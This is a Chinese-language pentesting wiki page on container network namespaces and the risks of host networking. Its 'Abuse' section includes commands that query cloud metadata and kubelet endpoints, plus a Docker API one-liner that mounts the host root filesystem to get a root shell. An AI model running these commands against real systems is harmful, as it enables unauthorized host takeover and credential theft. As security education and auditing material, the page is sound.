# 网络命名空间

{{#include ../../../../../banners/hacktricks-training.md}}

## 概览

网络命名空间隔离了与网络相关的资源，例如接口、IP 地址、路由表、ARP/neighbor 状态、防火墙规则、套接字，以及像 `/proc/net` 这类文件的内容。因此容器可以看起来拥有自己的 `eth0`、本地路由和回环设备，而无需拥有宿主机的真实网络栈。

从安全角度看，这很重要，因为网络隔离不仅仅是端口绑定。私有网络命名空间限制了工作负载可以直接观察或重配置的内容。一旦该命名空间与宿主机共享，容器可能会突然看到宿主机的监听器、宿主本地服务以及本不应暴露给应用程序的网络控制点。

## 工作原理

新创建的网络命名空间在接口附加之前，起初是一个空或几乎空的网络环境。容器运行时随后会创建或连接虚拟接口、分配地址并配置路由，以便工作负载获得预期的连接性。在基于 bridge 的部署中，这通常意味着容器会看到一个由 veth 支持、连接到宿主机 bridge 的接口。在 Kubernetes 中，CNI 插件负责 Pod 网络的等效设置。

这种架构解释了为什么 `--network=host` 或 `hostNetwork: true` 会带来如此剧烈的变化。工作负载不是获得一个预置的私有网络栈，而是加入了宿主机的真实网络栈。

## 实验

你可以使用以下命令查看一个几乎为空的网络命名空间：
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
你可以比较常规容器和使用 host 网络的容器：
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
使用主机网络的容器不再拥有自己隔离的套接字和接口视图。单这一点就已经非常重要，甚至在你询问进程拥有哪些能力之前。

## Runtime Usage

Docker 和 Podman 通常为每个容器创建一个私有的网络命名空间，除非另有配置。Kubernetes 通常为每个 Pod 提供自己的网络命名空间，Pod 内的容器共享该命名空间，但与主机隔离。Incus/LXC 系统也提供基于网络命名空间的丰富隔离，通常支持更为多样的虚拟网络配置。

通用原则是私有网络是默认的隔离边界，而主机网络是显式选择退出该边界的做法。

## Misconfigurations

最重要的错误配置就是直接共享主机的网络命名空间。有时出于性能、底层监控或方便的考虑会这样做，但它移除了容器可用的最清晰的边界之一。主机本地的监听程序会以更直接的方式变得可达，仅绑定到 localhost 的服务可能变得可访问，而像 `CAP_NET_ADMIN` 或 `CAP_NET_RAW` 这样的能力会变得更加危险，因为它们所启用的操作现在是对主机自身的网络环境生效。

另一个问题是在网络命名空间为私有时仍过度授予网络相关的能力。私有命名空间确实有帮助，但它并不会让原始套接字或高级网络控制变得无害。

在 Kubernetes 中，`hostNetwork: true` 也会改变你对 Pod 级网络分割的信任程度。Kubernetes 文档指出，许多网络插件无法在 `podSelector` / `namespaceSelector` 匹配时正确地区分 `hostNetwork` Pod 流量，因此会将其视为普通的节点流量。从攻击者的角度看，这意味着被攻破的 `hostNetwork` 工作负载通常应被视为一个节点级别的网络立足点，而不是仍受与 overlay-network 工作负载相同策略假设约束的普通 Pod。

## Abuse

在隔离较弱的环境中，攻击者可能会检查主机上的监听服务、访问仅绑定到环回接口的管理端点、嗅探或干扰流量（取决于具体的能力和环境），或者在存在 `CAP_NET_ADMIN` 时重新配置路由和防火墙状态。在集群中，这也会使横向移动和控制平面侦察变得更容易。

如果你怀疑存在主机网络，请先确认可见的接口和监听者是属于主机而不是属于隔离的容器网络：
```bash
ip addr
ip route
ss -lntup | head -n 50
```
仅在回环接口上侦听的服务通常是最先发现的有趣对象:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
如果存在网络能力，测试工作负载是否可以检查或更改可见的网络栈：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
在现代内核中，host networking 加上 `CAP_NET_ADMIN` 可能会在简单的 `iptables` / `nftables` 更改之外，暴露数据包路径。`tc` qdiscs 和 filters 也是命名空间范围的，因此在共享的主机网络命名空间中，它们会应用到容器可见的主机接口。如果同时存在 `CAP_BPF`，网络相关的 eBPF 程序（例如 TC 和 XDP 加载器）也会变得相关：
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
这很重要，因为攻击者可能在主机接口层面镜像、重定向、整形或丢弃流量，而不仅仅是重写防火墙规则。在私有 network namespace（网络命名空间）中，这些操作被限制在容器视角；在共享的主机 namespace 中，它们会影响到主机。

在集群或云环境中，主机网络也使得对元数据和与控制平面相邻（control-plane-adjacent）的服务进行快速本地侦察成为必要：
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### 完整示例： Host Networking + Local Runtime / Kubelet Access

Host networking 并不会自动授予主机 root，但它通常会暴露一些仅打算从节点自身访问的服务。如果这些服务中有一个防护薄弱，Host networking 就会成为一个直接的 privilege-escalation 路径。

Docker API 在 localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet 在 localhost 上:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
影响：

- 如果本地运行时 API 在没有适当保护的情况下被暴露，可能直接导致主机被攻陷
- 如果 kubelet 或本地代理可达，可能进行集群侦察或横向移动
- 在与 `CAP_NET_ADMIN` 结合时可能进行流量操控或拒绝服务

## 检查

这些检查的目标是弄清进程是否拥有私有网络栈、可见的路由和监听器有哪些，以及在你开始测试权限之前网络视图是否已经类似主机。
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
这里值得注意的点：

- 如果 `/proc/self/ns/net` 和 `/proc/1/ns/net` 已经看起来像宿主机，容器可能正在共享宿主机的网络命名空间或另一个非私有命名空间。
- `lsns -t net` 和 `ip netns identify` 在 shell 已经位于命名或持久命名空间时非常有用，它们可以让你将其与宿主机侧的 `/run/netns` 对象相关联。
- `ss -lntup` 特别有价值，因为它会显示仅在回环接口（loopback）上监听的监听器和本地管理端点。
- 如果存在 `CAP_NET_ADMIN`、`CAP_NET_RAW` 或 `CAP_BPF`，那么路由、接口名称、防火墙上下文、`tc` 状态和 eBPF 附着就变得更重要。
- 在 Kubernetes 中，来自 `hostNetwork` Pod 的 service 名称解析失败可能只是意味着该 Pod 未使用 `dnsPolicy: ClusterFirstWithHostNet`，而不是服务不存在。

在审查容器时，总是应当将网络命名空间与能力集一起评估。宿主网络加上强大的网络能力，与桥接网络加上有限的默认能力，代表完全不同的安全姿态。

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
